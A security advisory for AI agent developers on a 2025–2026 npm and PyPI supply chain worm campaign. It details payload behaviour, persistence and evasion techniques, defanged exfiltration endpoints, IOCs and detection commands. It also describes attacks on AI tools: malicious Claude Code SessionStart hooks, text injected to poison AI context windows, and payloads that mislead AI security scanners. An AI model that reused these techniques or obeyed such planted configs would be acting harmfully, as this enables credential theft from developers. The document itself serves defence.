# Supply Chain Defense for AI Agent Developers

Your npm dependencies, GitHub Actions, and credential managers are all attack surfaces. This guide covers what happened, what you can do about it, and how we protect our own supply chain.

---

## Case Study: Shai-Hulud — Sustained npm Supply Chain Campaign (Sept 2025–May 2026)

Shai-Hulud is not a single attack. It is a continuous campaign that has produced **ten named waves in nine months**, with the cadence accelerating through April–June 2026 to roughly one wave every 7–10 days. The latest waves have shifted focus from credential managers to **AI agent configuration files** — `.claude/settings.json`, `.vscode/tasks.json` — as primary persistence vectors.

This is not hypothetical. It is the dominant npm supply chain threat of 2026.

### Wave summary

| Wave | Date | Surface | Scale | Novelty |
|------|------|---------|-------|---------|
| First Coming | Sept 2025 | Original npm worm via `tinycolor` and friends | ~200 packages | Worm-style self-propagation via stolen npm tokens |
| Second Coming | Nov 2025 | 796 npm packages including `@ctrl/tinycolor`, `@nativescript-community/*` | ~796 packages, 20M+ weekly downloads | Mass account compromise, expanded payload |
| Third Coming (Bitwarden) | April 22, 2026 | `@bitwarden/cli@2026.4.0` via Checkmarx KICS Action poisoning | 1 high-trust package, 334 downloads | **First abuse of npm trusted publishing**; AI tool configs explicitly targeted |
| Mini — SAP CAP | April 29, 2026 | 4 SAP CAP packages (`@cap-js/sqlite`, `@cap-js/postgres`, `@cap-js/db-service`, `mbt`) | ~2 hours, 1,100+ exfil repos | **First weaponization of `.claude/settings.json` SessionStart hook** |
| Mini — TanStack | May 11, 2026 | `@tanstack/react-router` and 40+ `@tanstack/*` packages | 12M+ weekly downloads | GitHub Actions cache poisoning + **OIDC token extraction from `/proc/<pid>/mem`** — published without stealing npm credentials |
| Mini — AntV ("Here We Go Again") | May 19, 2026 | 323 packages via `atool` maintainer: `@antv/g2`, `@antv/g6`, `echarts-for-react`, `size-sensor`, `timeago.js`, others | 637 versions, ~16M weekly downloads, 2,200+ exfil repos | **Worm source code released publicly on BreachForums with a "supply chain contest"**; second wave weaponizing `.claude/settings.json` |
| Mini — Miasma ("The Spreading Blight") | June 1, 2026 | 32 `@redhat-cloud-services` packages (`@redhat-cloud-services/frontend-components`, `@redhat-cloud-services/chrome`, and 30 others — see [RHSB-2026-006](https://access.redhat.com/security/vulnerabilities/RHSB-2026-006)) | 96 versions, ~116,991 weekly downloads | **GitHub Actions OIDC compromise** (no stolen developer credentials); 4.1 MB obfuscated JS preinstall hook; **no attacker C2 domain** — exfil routes through legitimate vendor endpoints using stolen credentials |
| Mini — Phantom Gyp | June 3, 2026 | 57 packages across multiple maintainer accounts (`vapi`, `ai-sdk-ollama`, and 55 others) | ~2 hours, 57 packages | **`binding.gyp` hijack** — 157-byte file triggers code execution at install time without using `preinstall`/`postinstall` hooks; bypasses `--ignore-scripts` and most security tools; forged SLSA provenance + Sigstore signing; injects backdoor into AI IDE configs on every project open |
| Mini — Hades | June 8, 2026 | 19 PyPI packages in scientific computing / graph ML / bioinformatics ecosystem (`ensmallen`, `embiggen`, `gpsea`, `pyphetools`, `mflux-streamlit`, `nhmpy`, `ppkt2synergy`, and 12 others) | 19 packages, 37 malicious wheel artifacts | **First wave in this lineage to target PyPI exclusively**; **import-time execution** — payload fires in `__init__.py` on `import`, not at install; **AI Analyst Misdirection** — malware includes evasion techniques targeting AI-powered security scanners; cross-platform memory scrapers (Linux/macOS/Windows); wiper deterrent |
| Mini — Hades (MCP-targeting) | June 9, 2026 | 23 new PyPI packages targeting MCP developers and AI tooling consumers — typosquats (`rsquests`, `tlask`, `rlask`), MCP/AI-themed packages, `langchain-core-mcp` loader variant | 23 packages; campaign total: 471 artifacts (411 npm, 60 PyPI) | **Split-loader technique** — `langchain-core-mcp` deploys a `.pth` startup hook that searches `sys.path` for an externally staged `_index.js` payload instead of bundling it, bypassing static analysis that scans for JS payloads inside Python packages; first wave in this lineage explicitly targeting MCP developer tooling consumers |

[Source: Snyk, Wiz, StepSecurity, Akamai, SafeDep — see Sources section.]

The April–May 2026 cadence is set by **TeamPCP** (Google GTIG: UNC6780) running CanisterSprawl as the npm worm engine. With the source now public, expect copycats — Akamai already documented unrelated actors publishing variants within days of the May 19 release.

The Third Coming is what hit Bitwarden. It traces back to **February 27, 2026**, when threat actor **TeamPCP** (formally tracked by Google GTIG as **UNC6780**, payload designation **SANDCLOCK**) stole initial credentials from Aqua Security's Trivy via a misconfigured CI workflow. From there, the attacker pivoted through Checkmarx KICS and LiteLLM — these are the *entry chain within the Third Coming*, not separate Shai-Hulud waves — to reach Bitwarden's CI pipeline.

TeamPCP is a Russian-speaking, financially motivated actor (no state attribution). They have a formalized affiliate partnership with the **Vect ransomware-as-a-service** operation as of April 16, 2026 — credential harvesting now feeds ransomware extortion.

The npm worm component has a separate name in vendor tooling: **CanisterSprawl**. Search for either "Shai-Hulud" or "CanisterSprawl" when hunting for IOCs.

**Step-by-step attack flow:**

1. **Compromised GitHub Action** — TeamPCP compromised both `checkmarx/kics-github-action` (March 23 — all git tags poisoned via `setup.sh`) and `checkmarx/ast-github-action` (the downstream consequence). The C2 domain for the Action stage was `checkmarx[.]zone` — separate from the npm payload's `audit.checkmarx.cx` C2.
2. **CI pipeline poisoning** — The compromised Action executed during Bitwarden CLI's release workflow, giving the attacker write access to npm.
3. **Trusted publish abuse** — The attacker published `@bitwarden/cli@2026.4.0` through Bitwarden's legitimate CI pipeline. This was **the first known compromise of npm's trusted publishing mechanism** — the attacker didn't need stolen npm credentials because the CI pipeline published on their behalf.
4. **Preinstall hook trigger** — `package.json` invoked `bw_setup.js` via the `preinstall` lifecycle script.
5. **Payload execution** — `bw_setup.js` executed `bw1.js`, a 10 MB single-line obfuscated JavaScript bundle built with `javascript-obfuscator` using a 43,436-entry string table and a scrambled-alphabet cipher (seed `0x3039`).

### What the Payload Did

The `bw1.js` payload ran seven parallel credential collectors:

| Collector | Targets |
|-----------|---------|
| **Filesystem** | SSH keys (`~/.ssh/`), npm tokens (`.npmrc`), AWS credentials (`~/.aws/`), GCP service accounts, Azure credentials, kubeconfig, `.env` files |
| **Shell/environment** | Process environment variables, shell command history |
| **GitHub Actions secrets** | Extracted from Linux runner memory via `sudo python3` with pattern matching |
| **Cloud secrets managers** | AWS Secrets Manager, AWS SSM Parameter Store, GCP Secret Manager, Azure Key Vault (using ambient credentials) |
| **AI tool configurations** | Claude, Cursor, Codex CLI, Aider config files |
| **Persistence** | Injected heredoc blocks into `~/.bashrc` and `~/.zshrc` |
| **Anti-AI injection** | ~3,500 bytes of text injected into shell configs to poison AI tool context windows |

**Notable OPSEC choices:**
- Deliberately excluded `GITHUB_TOKEN` from exfiltration to avoid triggering GitHub's auto-revocation alerts.
- The malware exits immediately if the system locale starts with `ru` (Russian) — a common OPSEC pattern for Russian-origin threat actors.
- `package.json` declared version `2026.4.0` but the embedded `build/bw.js` metadata still read `2026.3.0` — a detectable version mismatch that wasn't caught pre-publication.

**Encryption and exfiltration:**
- Data encrypted with **AES-256-GCM** using random per-session keys.
- Keys wrapped with **RSA-OAEP** (only the attacker's private key can decrypt).
- Primary exfiltration to `audit[.]checkmarx[.]cx/v1/telemetry` (HTTPS) and fallback to `94[.]154[.]172[.]43`.
- **Dead-drop C2 via GitHub**: the payload queried GitHub's public commit search API for `LongLiveTheResistanceAgainstMachines`, using RSA/SHA-256 signed commits matching `/beautifulcastle/` as the command channel. The dead-drop account `helloworm00` (created **April 20, 2026** — two days before the attack), repository `helloworm00/hello-world`, and dead-drop commit `bc544f455d7c06c8a1f3446160a6d9a4a8236b11` are now public IOCs. Traffic to `github.com` is rarely flagged by security tools.

**Supply chain worm (CanisterSprawl):**
The worm component (CanisterSprawl) used stolen npm tokens to identify packages the victim had publish access to, injected malicious preinstall hooks into those packages, and re-uploaded them to npm — creating worm-style supply chain spread. Note: the **North Korea–nexus actor UNC1069** (Google GTIG) separately used credentials harvested by CanisterSprawl to compromise Axios on March 31. Two distinct threat actors operating in sequence on the same stolen credential pool.

**Coordinated multi-vector operation:**
[SANS ISC Update 008 (April 27, 2026)](https://www.ironcastle.net/teampcp-supply-chain-campaign-update-008-26-day-pause-ends-with-three-concurrent-compromises-checkmarx-kics-bitwarden-cli-cascade-xinference-pypi-canistersprawl-npm-worm-identified-and-tier-1/) revealed that April 22–23 was not an isolated Bitwarden incident. After a 26-day quiet period, TeamPCP conducted **three simultaneous compromises**:

1. **Checkmarx KICS Docker images and VS Code extensions** (new artifacts beyond the GitHub Action)
2. **Bitwarden CLI** (the event documented here)
3. **xinference on PyPI** (separate concurrent attack)

If you assess your exposure based on Bitwarden alone, you may miss two parallel attack vectors.

### Mini Shai-Hulud waves — April–May 2026 (the AI agent era)

After the Bitwarden incident, TeamPCP entered a high-cadence phase. Three waves in 21 days, each refining the technique. The unifying thread: **Claude Code and VS Code configuration files are now first-class persistence targets**, not afterthoughts.

#### Wave A — SAP CAP (April 29, 2026)

Seven days after Bitwarden. Four SAP CAP packages (`@cap-js/sqlite`, `@cap-js/postgres`, `@cap-js/db-service`, `mbt`) poisoned for ~2 hours starting 09:55 UTC. The payload **explicitly weaponized `.claude/settings.json` SessionStart hooks** and `.vscode/tasks.json` `folderOpen` triggers. 1,100+ public GitHub dead-drop repos created. First confirmed wave to treat AI agent configs as primary persistence.

#### Wave B — TanStack (May 11, 2026)

`@tanstack/react-router` (~12M weekly downloads) and 40+ related packages compromised. New technique chain:

1. Attacker created `zblgg/configuration` as a *renamed* fork of `TanStack/router` to evade GitHub fork-list searches.
2. Opened a PR triggering a `pull_request_target` workflow that ran attacker-controlled code.
3. The attacker-controlled code **poisoned the GitHub Actions cache with a malicious pnpm store**.
4. When legitimate maintainer PRs merged, the release workflow restored the poisoned cache.
5. Attacker binaries then **extracted OIDC tokens directly from `/proc/<pid>/mem`** of the Actions runner — publishing happened via npm's trusted publishing without ever stealing npm credentials.

This is the second confirmed abuse of npm trusted publishing (the first being Bitwarden). Affected versions include `@tanstack/react-router` 1.169.5 and 1.169.8.

#### Wave C — AntV "Here We Go Again" (May 19, 2026)

The largest mini wave to date. **323 packages, 637 versions, ~16M weekly downloads** affected via the compromised `atool` maintainer account. Published in two automated bursts:

- Wave 1: 01:39–01:56 UTC (~317 versions)
- Wave 2: 02:05–02:06 UTC (~320 versions, second wave added `bun` as an explicit dependency)

High-impact packages: `@antv/g2`, `@antv/g6`, `echarts-for-react`, `size-sensor` (4.2M weekly downloads alone), `timeago.js`. The 498 KB obfuscated payload:

- Harvests 80+ environment variables and 100+ file paths (AWS, GitHub, npm tokens, SSH keys, cloud creds, AI tool configs)
- Encrypts data with **RSA-OAEP** and exfiltrates to `t.m-kosche.com:443/api/public/otel/v1/traces` (masquerades as OpenTelemetry traffic) and GitHub dead-drop repos
- Creates 2,200+ public GitHub dead-drop repos under Dune-themed names — combinations of `sardaukar`, `mentat`, `fremen`, `atreides`, `harkonnen`, `gesserit`, `fedaykin`, `tleilaxu` + `sandworm`, `ornithopter`, `stillsuit` — with descriptions containing the reversed string `niagA oG eW ereH :duluH-iahS` ("Shai-Hulud: Here We Go Again")
- Plants persistence via `.claude/settings.json` SessionStart hook, `.vscode/tasks.json` `runOn: folderOpen`, `~/Library/LaunchAgents/com.user.kitty-monitor.plist` (macOS), `~/.config/systemd/user/kitty-monitor.service` (Linux), and a C2 daemon at `~/.local/share/kitty/cat.py`
- Worms by searching harvested credentials for npm tokens with `bypass_2fa` scope, then republishing to other packages the compromised account maintains, including injecting `chore/add-codeql-static-analysis` branches with malicious workflows

**The most important development:** TeamPCP **released the worm source code publicly on BreachForums** along with a "supply chain attack contest." Within days, an unrelated actor uploaded four malicious npm packages — one a near-verbatim copy with its own C2. The barrier to entry just dropped to zero. Expect copycat waves at irregular intervals from here.

#### Wave D — Miasma "The Spreading Blight" (June 1, 2026)

Five days after TeamPCP released the worm source code publicly, a new wave hit the `@redhat-cloud-services` npm namespace. **96 versions across 32 packages** (~116,991 weekly downloads) were published with a malicious 4.1 MB obfuscated JS preinstall hook.

**Compromise vector:** Unlike all prior Shai-Hulud waves, Miasma did **not** rely on stolen developer npm credentials. TeamPCP compromised a GitHub Actions OIDC token directly from a Red Hat CI/CD pipeline — the same pipeline-poisoning technique as the TanStack Wave B attack, with no individual developer account compromise required.

**Payload targets:** AWS, Azure, GCP, HashiCorp Vault, Kubernetes service account tokens, GitHub Actions OIDC tokens, npm publish tokens, Bitwarden, and 1Password.

**Novel characteristics vs. prior waves:**
- **No attacker C2 domain** — all data exfiltration routes through legitimate vendor API endpoints (AWS STS, Azure AD, GCP IAM, GitHub API, npm registry, vault APIs) with stolen credentials. Standard egress-based C2 detection tools cannot detect this exfil channel.
- **Bun-based payload** — the preinstall hook downloads a Bun runtime binary to `/tmp/b-<random>/bun` and a JS payload to `/tmp/p<base36>.js`. Both are removed on successful exfiltration but may persist if the process crashes.
- **Dead-drop IOC** — attacker GitHub repos with description "Miasma: The Spreading Blight" (same TeamPCP dead-drop pattern as prior waves).

Red Hat published RHSB-2026-006 within hours of Wiz Research's disclosure. The full list of 32 affected packages and specific compromised version ranges is in [RHSB-2026-006](https://access.redhat.com/security/vulnerabilities/RHSB-2026-006).

Source: [Wiz — Miasma: The Spreading Blight](https://www.wiz.io/blog/miasma-supply-chain-attack-targeting-redhat-npm-packages) | [Snyk — Miasma supply chain attack](https://snyk.io/blog/miasma-supply-chain-attack-malicious-code-redhat-cloud-services-npm-packages/) | [Red Hat RHSB-2026-006](https://access.redhat.com/security/vulnerabilities/RHSB-2026-006) | [JFrog — Shai-Hulud Miasma](https://research.jfrog.com/post/shai-hulud-miasma-redhat-cloud-services/) | [BleepingComputer — Red Hat npm packages compromised](https://www.bleepingcomputer.com/news/security/red-hat-npm-packages-compromised-to-steal-developer-credentials/) (all HTTP 403 — bot-protection pattern; search-confirmed live)

#### Wave D Extension — Miasma Reaches Microsoft Azure GitHub Organizations (June 5–6, 2026)

Four days after the initial Miasma npm wave, the worm's propagation capabilities reached a new phase: it jumped from npm to GitHub repository configuration files. On June 5–6, 2026, GitHub disabled **73 Microsoft repositories** across four organizations (Azure, Azure-Samples, Microsoft, MicrosoftDocs) in a 105-second automated sweep after detecting malicious commits.

**How the worm spread:** A compromised contributor account with write access to `Azure/durabletask` pushed a commit that planted AI agent configuration files — `.claude/settings.json`, `.vscode/tasks.json`, `.cursor/settings.json`, and cursor rules — into the repository. The configuration files contained a credential-harvesting payload that executes when any developer opens the repository in Claude Code, Gemini CLI, Cursor, or VS Code Insiders.

**Scale:** 73 repositories disabled in 105 seconds. Worm fingerprints (dead-drop patterns, payload structure, exfil routing) match the Miasma/TeamPCP wave. No Microsoft Azure credentials are confirmed stolen; GitHub's automated abuse detection interrupted propagation before confirmed exfil.

**Why AI agent config files:** `.claude/settings.json` `SessionStart` hooks execute on every Claude Code session open; `.vscode/tasks.json` `"runOn": "folderOpen"` tasks execute when VS Code opens the folder. A developer cloning any of the 73 affected repos and opening in a supported IDE would have triggered the payload. This marks an explicit shift in TeamPCP strategy — from npm install-time execution to IDE open-time execution via repository configuration files.

Source: [The Hacker News — Miasma Worm Jumps to GitHub, Disables 73 Microsoft Repos in 105 Seconds](https://thehackernews.com/2026/06/miasma-worm-jumps-github-disables-73.html) (HTTP 403 — bot-protection pattern; search-confirmed live via The Next Web, byteiota, thecybersecguru, opensourcemalware.com)

#### Wave E — Phantom Gyp (June 3, 2026)

Two days after Miasma, the same worm family returned with a new evasion technique. **57 packages** across multiple maintainer accounts were compromised in under two hours, including `vapi`, `ai-sdk-ollama`, and 55 others.

**The Phantom Gyp technique:** Instead of using `preinstall` or `postinstall` hooks in `package.json` — the fields security tools and `--ignore-scripts` specifically monitor — the attacker placed a weaponized **157-byte `binding.gyp` file** in each package. When npm encounters a `binding.gyp` file, it automatically invokes `node-gyp` as a build step; this execution path is **outside** the `scripts` block and **not suppressed by `--ignore-scripts`**.

**Why this matters:** Every defense built on `--ignore-scripts` fails against this wave. This includes:
- `npm install --ignore-scripts` (does not block `binding.gyp` execution)
- `npm ci --ignore-scripts`
- npm audit hooks that only inspect `package.json` scripts fields
- The Shai-Hulud scanner script's `npm config ignore-scripts` check

**Payload capabilities:** Same credential-harvesting template as Wave D plus a new persistence layer — the malware injects a backdoor file into AI coding assistant project configurations (`.claude/settings.json`, `.cursor/settings.json`, `.vscode/tasks.json`) so that opening the project in any supported IDE re-executes the payload.

**Dead-drop IOC:** Stolen credentials exfiltrated to GitHub repos created under the account `liuende501` (236+ repositories, encrypted JSON files). No named C2 beacon domain confirmed by research sources as of June 6.

**Signed attestations do not help:** The wave also forged SLSA provenance and Sigstore signatures on all republished packages — `npm audit signatures` shows green. The only reliable defense is staged publishing approval, which was not yet widely adopted across affected maintainer accounts.

Source: [StepSecurity — Binding.gyp npm supply chain attack](https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm) | [Snyk — Node-gyp supply chain compromise](https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/) | [The Hacker News — IronWorm and new Miasma worm variant](https://thehackernews.com/2026/06/ironworm-and-new-miasma-worm-variant.html) | [Corgea — Phantom Gyp Miasma](https://corgea.com/research/miasma-phantom-gyp-npm-worm-vapi-ai-sdk-ollama-june-2026) (all HTTP 403 — bot-protection pattern; search-confirmed live)

#### Wave F — Hades (June 8, 2026)

Five days after Phantom Gyp, a new wave hit PyPI — the first in this campaign family to target Python packages exclusively. **19 packages** in the scientific computing, bioinformatics, and graph ML space (targeting researchers, data scientists, and AI developers) were trojanized across 37 malicious wheel artifacts.

**Key affected packages:** `ensmallen` (v0.8.101), `embiggen`, `gpsea`, `pyphetools`, `mflux-streamlit`, `nhmpy`, `ppkt2sinergy`, and 12 others in the computational biology / MCP developer ecosystem.

**Import-time execution:** Unlike Waves A–E which fired at npm install time, the Hades payload embeds an obfuscated script inside each package's `__init__.py`. It executes the moment you run `import ensmallen` (or any affected package) — **even if you installed with `pip install --no-deps` and audited `setup.py`**. Standard install-time defenses offer no protection.

**AI Analyst Misdirection:** The payload includes a layer specifically designed to evade AI-powered security tools. When an AI security agent or LLM-based scanner inspects the compromised package, the malware returns benign-looking output, masking its credential-harvesting behavior. This is the first publicly documented supply chain payload that actively targets AI security tooling as an evasion surface.

**Cross-platform memory scrapers:** The payload deploys tailored memory scrapers for Linux (parsing `/proc/<pid>/maps`), macOS, and Windows — extracting encrypted credentials directly from process memory rather than filesystem reads. This approach bypasses credential managers that store secrets in memory rather than disk.

**Wiper deterrent:** The payload includes a deterrent against forensic analysis — a wiper component that can erase evidence on detection.

**Attribution:** Multiple vendors describe Hades as a Miasma/Shai-Hulud lineage campaign. Socket Research did not explicitly attribute Hades to TeamPCP/UNC6780. Treat it as a related campaign with uncertain direct attribution.

Source: [StepSecurity — The Hades Campaign: Graph ML PyPI Packages Deploy Cross-Platform Memory Scrapers](https://www.stepsecurity.io/blog/the-hades-campaign-pypi-packages) | [Socket.dev — Shai-Hulud Descends to Hades: Miasma Worm Campaign Spreads with New PyPI Wave](https://socket.dev/blog/shai-hulud-descends-to-hades-miasma-pypi-wave) | [DarkReading — 'Hades' Campaign Against PyPI Puts New Spin on Shai-Hulud](https://www.darkreading.com/application-security/hades-campaign-pypi-shai-hulud) | [BleepingComputer — New Shai-Hulud Attack Trojanizes 19 Science-Focused PyPI Packages](https://www.bleepingcomputer.com/news/security/new-shai-hulud-attack-trojanizes-19-science-focused-pypi-packages/) (all HTTP 403 — bot-protection pattern; search-confirmed live)

#### Wave G — Hades MCP-Targeting (June 9, 2026)

One day after the bioinformatics wave, the same Hades campaign expanded its scope to **MCP developers and AI tooling consumers**. **23 new malicious PyPI packages** were published in three clusters: typosquats of widely-used Python libraries, MCP/AI-themed packages impersonating LangChain and OpenAI tooling, and a novel loader variant.

**Typosquats:** `rsquests`, `tlask`, `rlask` — single-character misspellings of `requests` and `flask` that capture install-time typos.

**MCP/AI-themed packages:** packages with names suggesting LangChain MCP adapters, OpenAI tooling, and MCP server helpers, targeting developers searching for MCP integration libraries.

**Split-loader technique (`langchain-core-mcp`):** This is the technically novel artifact in Wave G. Prior Hades packages bundled `_index.js` directly inside the wheel. `langchain-core-mcp` instead installs only a `.pth` Python startup hook. Rather than including its own JavaScript payload, the loader searches `sys.path` for an `_index.js` staged by a companion package that the attacker published separately. The effect: static analyzers that scan for bundled JavaScript inside Python packages find nothing suspicious in `langchain-core-mcp` itself. Detection requires identifying the `.pth` loader's suspicious `sys.path` search behavior.

**Payload:** Same Bun-staged obfuscated JavaScript stealer as Wave F. Targets API tokens, cloud credentials (AWS, Azure, GCP), SSH keys, Kubernetes service account tokens, Docker configurations, package registry secrets, and shell histories.

**Persistence:** The `.pth` startup hook persists in `site-packages` even after `pip uninstall langchain-core-mcp` — it continues executing on every Python process until the `.pth` file is manually removed from site-packages. Same persistence model as the LiteLLM `.pth` attack (March 2026).

**Campaign total after Wave G:** 471 artifacts — 411 npm across 106 packages, 60 PyPI across 37 packages.

**Attribution:** Same Hades/Shai-Hulud lineage as Wave F. Not explicitly attributed to TeamPCP/UNC6780 by Socket Research; treat as related campaign pending further attribution.

Source: [Socket.dev — Mini Shai-Hulud, Miasma, and Hades Worms Target Bioinformatics and MCP Developers via Malicious PyPI Packages](https://socket.dev/blog/mini-shai-hulud-miasma-and-hades-worms-target-bioinformatics-and-mcp-developers-via-malicious) | [SecurityWeek — Over 100 NPM, PyPI Packages Hit in New Shai-Hulud Supply Chain Attacks](https://www.securityweek.com/over-100-npm-pypi-packages-hit-in-new-shai-hulud-supply-chain-attacks/) | [CyberSecurityNews — New Shai-Hulud Attack Compromises 23 PyPI Packages to Target MCP Developers](https://cybersecuritynews.com/23-pypi-packages-compromised/) | [TechNadu — New PyPI Wave in Mini Shai-Hulud, Miasma, and Hades Campaign](https://www.technadu.com/new-pypi-wave-in-mini-shai-hulud-miasma-and-hades-campaign-23-new-malicious-pypi-artifacts/629139/) (all HTTP 403 — bot-protection pattern; search-confirmed live)

#### What to do right now if you use Claude Code

1. **Audit `.claude/settings.json` in every project you've opened** in the last 30 days. Any `SessionStart`, `PreToolUse`, or `PostToolUse` hook that doesn't point to your own scripts or known-good plugin paths (`~/.claude/hooks/<your-tooling>/`) should be treated as suspicious until verified.
2. **Audit `.vscode/tasks.json` for `"runOn": "folderOpen"`**. Legitimate uses exist but are rare; assume malicious until proven otherwise.
3. **Run the IOC scan**: check `~/Library/LaunchAgents/com.user.kitty-monitor.plist`, `~/.local/share/kitty/cat.py`, `~/.local/bin/gh-token-monitor.sh`, and `/tmp/tmp.987654321.lock`. Any of these = compromised host.
4. **Search your GitHub account for dead-drop repos** matching the Dune-themed naming. If you find any, your `gh` token has been exfiltrated — revoke immediately, then rotate every credential it could reach.
5. **Set `ignore-scripts=true` in `~/.npmrc`** if you haven't already. This setting blocks Waves A–D but does **not** block Wave E (Phantom Gyp) — see item 8.
6. **The bash-firewall and secret-guard hooks llm-safe-haven installs** catch the SessionStart-hook abuse pattern at session start. If you're not running them, install via `npx llm-safe-haven`.
7. **Wave D (Miasma, June 1): Check for Bun-based IOCs and the new dead-drop pattern.** Run `find /tmp -maxdepth 2 -name "bun" -path "*/b-*"` and `find /tmp -maxdepth 1 -name "p*.js"` — either file surviving means the Miasma payload crashed mid-run on your machine. Also search GitHub for repos with description "Miasma: The Spreading Blight" — that is the Wave D dead-drop equivalent of the Dune-themed naming used in Waves A–C.
8. **Wave E (Phantom Gyp, June 3): `--ignore-scripts` does NOT block `binding.gyp`-triggered code execution.** Audit any package you install for unexpected `binding.gyp` files before running `npm install`, and consider Socket.dev or snyk/agent-scan which detect the `binding.gyp` attack pattern. `npm audit signatures` shows green for compromised Phantom Gyp packages — provenance verification alone is insufficient. **npm v12 (July 2026) will block `binding.gyp`-triggered builds by default** — update to npm 11.16.0+ now to audit affected packages before the migration deadline.
9. **Wave D Extension (Miasma Azure GitHub, June 5–6): Audit any Microsoft Azure/Azure-Samples/Microsoft/MicrosoftDocs repository** you cloned between June 5–7, 2026. If you opened a clone in Claude Code, VS Code, Cursor, or Gemini CLI during that window, rotate credentials. Check `.claude/settings.json`, `.vscode/tasks.json`, and `.cursor/settings.json` for hooks you did not add.
10. **Wave F (Hades, June 8, 2026): If you use any scientific computing, bioinformatics, or graph ML Python packages**, run `pip list | grep -E "ensmallen|embiggen|gpsea|pyphetools|mflux-streamlit|nhmpy|ppkt2synergy"`. Any match → treat the host as compromised (import-time execution; payload fired the moment the package was imported). Standard install-time audit (`pip audit`, `safety check`) will not flag packages delivered as malicious wheels; cross-reference your installed versions against the affected version lists at PyPI's removal notices. AI-powered security scanners may return false-clean results — the payload actively evades them (AI Analyst Misdirection). If any package was imported since June 8, rotate all credentials accessible from that environment.
11. **Wave G (Hades MCP-targeting, June 9, 2026): If you use LangChain, Flask, requests, OpenAI, or MCP integration libraries from PyPI**, run `pip list | grep -E "rsquests|tlask|rlask|langchain-core-mcp"`. Any match → treat the host as compromised. Import-time execution: same payload model as Wave F. Additionally: check for orphaned `.pth` loader entries with `find $(python3 -c "import site; print(' '.join(site.getsitepackages()))") -name "*.pth" | xargs grep -l "_index.js" 2>/dev/null` — the `langchain-core-mcp` split-loader deposits a `.pth` file in `site-packages` that persists after `pip uninstall` and re-executes on every Python process start. Delete any such `.pth` file manually if found.

### Timeline

| Time (ET) | Event |
|-----------|-------|
| Feb 27, 2026 | TeamPCP steals credentials via Aqua Security/Trivy misconfigured CI |
| Before April 22 | Campaign extends through Checkmarx KICS, LiteLLM |
| April 22, 5:57 PM | `@bitwarden/cli@2026.4.0` published to npm with malicious payload |
| April 22, 7:30 PM | Compromised package removed; access revoked |
| April 23 | `@bitwarden/cli@2026.4.1` re-released (clean rebuild from 2026.3.0 codebase) |

**93-minute window. ~334 downloads affected.** JFrog and Socket.dev identified the compromise independently through behavioral and payload analysis.

### Why This Matters for AI Agent Developers

1. **Credential managers are the recommended solution** — we tell developers to use Bitwarden, 1Password, etc. instead of env vars. When the credential manager itself is compromised, the entire trust model collapses.
2. **AI tool configs were explicitly targeted** — the payload searched for Claude, Cursor, Codex CLI, and Aider configurations. AI agents are high-value targets because they have access to code, secrets, and deployment infrastructure.
3. **npm packages are an attack surface for CLI tools** — the official Bitwarden CLI is distributed via npm. `rbw` (the unofficial Rust client) is distributed via cargo/homebrew and was NOT affected. Distribution channel matters.
4. **Trusted publishing can be weaponized** — the attacker didn't steal npm credentials. They compromised an upstream GitHub Action that was part of the publish pipeline. The "trusted" publish was legitimate from npm's perspective.

### GitHub's Response

In direct response to Shai-Hulud and the broader npm supply chain attack pattern, GitHub published [Our plan for a more secure npm supply chain](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/). As of May 22, 2026, the two highest-leverage items have shipped GA:

- **Staged publishing — GA in npm CLI 11.15.0 (May 22, 2026).** `npm stage publish` uploads to a staging queue requiring a 2FA-verified maintainer approval before the version becomes installable. See the [May 22 case study](#case-study-may-22-2026--npm-platform-hardens-plus-two-independent-cross-ecosystem-worms) below and the Publishers guide Section 4.
- **Install-time `--allow-*` controls — GA in npm CLI 11.15.0.** `--allow-file`, `--allow-remote`, `--allow-directory`, and `--allow-git` gate non-registry install sources. `--allow-git` default flips to `none` in npm v12.
- **Bulk trusted publishing migration tooling** — [GA February 18, 2026](https://github.blog/changelog/2026-02-18-npm-bulk-trusted-publishing-config-and-script-security-now-generally-available/).
- **Platform-wide token resets** — npm [invalidated every bypass-2FA granular access token](https://socket.dev/blog/npm-invalidates-tokens-mini-shai-hulud) on May 19, 2026 after the @antv compromise.
- **Granular tokens with 7-day lifetime maximum** for local publishing — rolling out.
- **FIDO-based 2FA** replacing TOTP; legacy classic tokens being deprecated.

This is a structural change to npm publishing, not a policy update. Combined with the [GitHub Actions 2026 Security Roadmap](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) (workflow dependency locking, scoped secrets, native egress firewall), the platform is responding to the threat that Shai-Hulud demonstrated.

### Sources

- [The Hacker News — Bitwarden CLI Compromised in Ongoing Shai-Hulud Attack](https://thehackernews.com/2026/04/bitwarden-cli-compromised-in-ongoing.html)
- [OX Security — Shai-Hulud: Bitwarden CLI Supply Chain Attack](https://www.ox.security/blog/shai-hulud-bitwarden-cli-supply-chain-attack/)
- [Endor Labs — Shai-Hulud: The Third Coming](https://www.endorlabs.com/learn/shai-hulud-the-third-coming----inside-the-bitwarden-cli-2026-4-0-supply-chain-attack)
- [Socket.dev — Bitwarden CLI Compromised](https://socket.dev/blog/bitwarden-cli-compromised)
- [Bitwarden Community — Statement on Checkmarx Supply Chain Incident](https://community.bitwarden.com/t/bitwarden-statement-on-checkmarx-supply-chain-incident/96127)
- [SANS ISC Update 008 — April 27, 2026 (Iron Castle Systems)](https://www.ironcastle.net/teampcp-supply-chain-campaign-update-008-26-day-pause-ends-with-three-concurrent-compromises-checkmarx-kics-bitwarden-cli-cascade-xinference-pypi-canistersprawl-npm-worm-identified-and-tier-1/)
- [SANS ISC — TeamPCP UNC6780 designation](https://isc.sans.edu/diary/32880)
- [StepSecurity — Checkmarx KICS GitHub Action Compromised](https://www.stepsecurity.io/blog/checkmarx-kics-github-action-compromised-malware-injected-in-all-git-tags)
- [Cloud Security Alliance — CanisterSprawl npm worm](https://labs.cloudsecurityalliance.org/research/csa-research-note-npm-canistersprawl-supply-chain-worm-20260/)
- [Industrial Cyber — Vect + TeamPCP RaaS alliance](https://industrialcyber.co/ransomware/vect-formalizes-breachforums-and-teampcp-alliance-to-push-model-for-industrialized-ransomware-scale-raas-operations/)
- [GitHub Blog — Our plan for a more secure npm supply chain](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/)
- [Hacking Passion — Bitwarden CLI Supply Chain Attack](https://hackingpassion.com/bitwarden-cli-supply-chain-attack/)
